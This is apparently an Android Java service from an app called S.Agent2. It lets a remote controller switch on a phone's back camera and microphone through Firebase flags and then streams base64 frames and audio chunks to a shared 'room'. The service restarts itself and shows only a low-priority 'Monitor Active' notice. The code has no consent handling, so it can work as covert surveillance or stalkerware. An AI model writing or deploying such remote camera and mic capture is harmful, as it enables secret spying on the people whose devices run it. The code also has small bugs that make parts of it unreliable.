package com.sagent.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageAnalysis;
import androidx.camera.core.ImageProxy;
import androidx.lifecycle.LifecycleService;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class HostService extends LifecycleService {
    private String roomId;
    private DatabaseReference roomRef;
    private ExecutorService cameraExecutor;
    
    // Camera Variables
    private androidx.camera.core.CameraProvider cameraProvider;
    private AtomicBoolean isUploadingFrame = new AtomicBoolean(false);
    private boolean isCameraOn = false;

    // Audio Variables
    private AudioRecord audioRecord;
    private AtomicBoolean isUploadingAudio = new AtomicBoolean(false);
    private boolean isMicOn = false;
    private boolean isRecordingAudio = false;
    private Handler timeoutHandler = new Handler(Looper.getMainLooper());

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForegroundService();

        if (intent != null && intent.hasExtra("roomId")) {
            roomId = intent.getStringExtra("roomId");
        } else {
            roomId = getSharedPreferences("SAgentPrefs", MODE_PRIVATE).getString("roomId", null);
        }
        if (roomId == null) { stopSelf(); return START_NOT_STICKY; }

        roomRef = FirebaseDatabase.getInstance().getReference("rooms").child(roomId);
        roomRef.child("host_active").onDisconnect().setValue(false);
        roomRef.child("host_active").setValue(true);

        cameraExecutor = Executors.newSingleThreadExecutor();
        listenToCommands();

        return START_STICKY;
    }

    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("hostbg", "Host Background", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, "hostbg")
                    .setContentTitle("S.Agent2 Monitor Active")
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .build();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(2, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(2, notification);
            }
        }
    }

    private void listenToCommands() {
        roomRef.child("camera_control").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean camOn = snapshot.getValue(Boolean.class);
                if (camOn != null && camOn && !isCameraOn) {
                    startCamera();
                } else if (camOn != null && !camOn && isCameraOn) {
                    stopCamera();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });

        roomRef.child("mic_control").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean micOn = snapshot.getValue(Boolean.class);
                if (micOn != null && micOn && !isMicOn) {
                    startMic();
                } else if (micOn != null && !micOn && isMicOn) {
                    stopMic();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    private void startCamera() {
        isCameraOn = true;
        androidx.camera.core.CameraProvider cameraProvider = androidx.camera.lifecycle.ProcessCameraProvider.getInstance(this).get();
        cameraProvider.unbindAll();

        ImageAnalysis imageAnalysis = new ImageAnalysis.Builder()
                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST) // Loop Fix
                .build();

        imageAnalysis.setAnalyzer(cameraExecutor, imageProxy -> {
            if (isUploadingFrame.get() || !isCameraOn) {
                imageProxy.close();
                return;
            }
            isUploadingFrame.set(true);
            // Timeout: Agar 2 sec me upload nahi hua to reset
            timeoutHandler.postDelayed(() -> isUploadingFrame.set(false), 2000);

            ByteBuffer buffer = imageProxy.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buffer.remaining()];
            buffer.get(bytes);
            String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);

            Map<String, Object> frameData = new HashMap<>();
            frameData.put("image", base64);
            frameData.put("width", imageProxy.getWidth());
            frameData.put("height", imageProxy.getHeight());
            
            roomRef.child("camera_frame").setValue(frameData).addOnCompleteListener(task -> {
                isUploadingFrame.set(false);
                timeoutHandler.removeCallbacksAndMessages(null);
            });
            imageProxy.close();
        });

        cameraProvider.bindToLifecycle(this, CameraSelector.DEFAULT_BACK_CAMERA, imageAnalysis);
    }

    private void stopCamera() {
        isCameraOn = false;
        if (cameraProvider != null) cameraProvider.unbindAll();
        roomRef.child("camera_frame").removeValue();
    }

    private void startMic() {
        isMicOn = true;
        isRecordingAudio = true;
        
        int sampleRate = 16000;
        int bufferSize = AudioRecord.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            audioRecord = new AudioRecord.Builder()
                .setAudioSource(MediaRecorder.AudioSource.MIC)
                .setAudioFormat(new AudioFormat.Builder()
                    .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                    .setSampleRate(sampleRate)
                    .setChannelMask(AudioFormat.CHANNEL_IN_MONO)
                    .build())
                .setBufferSizeInBytes(bufferSize)
                .build();
        }
        
        audioRecord.startRecording();

        new Thread(() -> {
            byte[] audioBuffer = new byte[4096];
            while (isRecordingAudio) {
                if (isUploadingAudio.get()) continue;
                int read = audioRecord.read(audioBuffer, 0, audioBuffer.length);
                if (read > 0) {
                    isUploadingAudio.set(true);
                    timeoutHandler.postDelayed(() -> isUploadingAudio.set(false), 1500);
                    
                    String base64Audio = Base64.encodeToString(audioBuffer, 0, read, Base64.NO_WRAP);
                    roomRef.child("audio_chunk").setValue(base64Audio).addOnCompleteListener(task -> {
                        isUploadingAudio.set(false);
                    });
                }
            }
        }).start();
    }

    private void stopMic() {
        isMicOn = false;
        isRecordingAudio = false;
        if (audioRecord != null) {
            audioRecord.stop();
            audioRecord.release();
            audioRecord = null;
        }
    }

    @Override
    public void onDestroy() {
        if (roomRef != null) roomRef.child("host_active").setValue(false);
        stopCamera();
        stopMic();
        if (cameraExecutor != null) cameraExecutor.shutdown();
        super.onDestroy();
    }
}
